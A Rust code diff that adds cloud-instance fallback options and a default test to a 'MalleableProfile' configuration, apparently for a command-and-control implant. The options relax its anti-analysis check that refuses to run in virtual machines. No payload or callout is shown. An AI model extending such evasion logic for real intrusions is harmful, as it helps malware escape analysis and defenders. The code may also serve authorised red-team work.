@@ -120,6 +120,24 @@ pub struct MalleableProfile {
     /// bypassed for this trusted cloud VM.
     #[serde(default)]
     pub cloud_instance_id: Option<String>,
+    /// Security override for IMDS body failures. When `true`, a host that
+    /// passes IMDS reachability checks but does not return a parseable
+    /// instance-id is still treated as trusted for VM-refusal bypass.
+    ///
+    /// Trade-off: this weakens identity binding from an exact instance-id to
+    /// metadata reachability only. Keep `false` unless IMDS body access is
+    /// unreliable in your environment.
+    #[serde(default)]
+    pub cloud_instance_allow_without_imds: bool,
+    /// Fallback instance-id pattern list used only when IMDS instance-id
+    /// retrieval fails. If at least one non-empty pattern is configured and
+    /// the host matches an expected cloud hypervisor signature, VM-refusal can
+    /// be bypassed as a break-glass fallback.
+    ///
+    /// Trade-off: this is less strict than exact `cloud_instance_id` matching
+    /// and should be used sparingly; prefer exact ID pinning whenever possible.
+    #[serde(default)]
+    pub cloud_instance_fallback_ids: Vec<String>,
     /// SSH relay hostname for the `ssh-transport` feature.
     #[serde(default)]
     pub ssh_host: Option<String>,
@@ -180,6 +198,8 @@ impl Default for MalleableProfile {
             cdn_endpoint: String::new(),
             kill_date: String::new(),
             cloud_instance_id: None,
+            cloud_instance_allow_without_imds: false,
+            cloud_instance_fallback_ids: Vec::new(),
             ssh_host: None,
             ssh_port: None,
             ssh_username: None,
@@ -491,5 +511,12 @@ mod tests {
             cache,
             cfg.allowed_paths
         );
+    }
+
+    #[test]
+    fn default_cloud_fallback_whitelisting_is_disabled() {
+        let profile = MalleableProfile::default();
+        assert!(!profile.cloud_instance_allow_without_imds);
+        assert!(profile.cloud_instance_fallback_ids.is_empty());
     }
 }
